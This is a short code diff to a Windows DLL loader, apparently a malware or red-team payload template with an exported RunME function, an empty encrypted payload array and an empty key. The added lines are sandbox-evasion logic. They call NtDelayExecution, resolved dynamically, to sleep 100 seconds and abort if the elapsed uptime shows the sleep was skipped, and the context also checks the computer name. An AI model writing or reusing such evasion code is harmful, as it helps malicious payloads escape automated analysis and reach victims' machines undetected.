@@ -43,6 +43,15 @@ __declspec(dllexport) BOOL WINAPI RunME(void) {
     GetComputerNameW(computerName, &computerNameLength);
     CharUpperW(computerName);
     if (wcsstr(computerName, L"DESKTOP-")) return false;
+    
+    ULONGLONG uptimeBeforeSleep = GetTickCount();
+    typedef NTSTATUS(WINAPI *PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
+    PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
+    LARGE_INTEGER delay;
+    delay.QuadPart = -10000 * 100000; // 100 seconds
+    pNtDelayExecution(FALSE, &delay);
+    ULONGLONG uptimeAfterSleep = GetTickCount();
+    if ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) return false;
 
     const char calc_payload[] = { };
     char pl_key[] = "";
